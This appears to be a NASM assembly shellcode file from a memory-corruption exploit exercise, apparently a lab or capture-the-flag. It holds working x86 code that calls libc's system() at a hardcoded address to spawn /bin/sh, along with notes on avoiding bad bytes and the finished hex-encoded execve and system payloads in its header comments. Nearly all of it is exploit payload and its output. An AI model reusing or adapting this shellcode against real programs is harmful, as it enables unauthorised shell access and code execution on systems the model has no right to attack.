;nasm -f elf32 -o payload_asm.o payload_asm.asm; objdump -d payload_asm.o
;final hexdump execve: (char[22]){0xbb, 0x42, 0x42, 0x42, 0x42, 0x31, 0xc0, 0xb0, 0x0b, 0x31, 0xc9, 0x31, 0xd2, 0xcd, 0x80, 0x31, 0xc0, 0x40, 0x31, 0xdb, 0xcd, 0x80}
;final hexdump system: (char[20]){0x68, 0x42, 0x42, 0x42, 0x42, 0xb8, 0x5f, 0xb0, 0xe6, 0xb7, 0x40, 0xff, 0xd0, 0x31, 0xc0, 0x40, 0x31, 0xdb, 0xcd, 0x80}

;invalid hexes: 0x0a(\n), 0x00(\0), 0x09(\t), 0x20(' '), 0x60('`')
;found: 0x60 because of system function being at 0xb7e6b060
;solution: load system in 2 steps (load eax with system - 1, call inc on eax)

;does not work, let's try execve instead

section .text
	global _start

_start:
	;mov ebx, 0x42424242; position of /bin/sh
	;xor eax, eax
	;mov al, 11
	;xor ecx, ecx; clear ecx (argv)
	;xor edx, edx; clear edx (env)
	;int 0x80
	;xor eax, eax
	;inc eax
	;xor ebx, ebx
	;int 0x80

	push 0x42424242; our /bin/sh will be right after this asm
	mov eax, 0xb7e6b05f; location of 'system' function - 1 (we do that because 0x60 is the backquote, and seemd to throw errors before)
	inc eax
	call eax

	xor eax, eax
	inc eax
	xor ebx, ebx; we can use a clean exit(0) this time since we aren't limited anymore
	int 0x80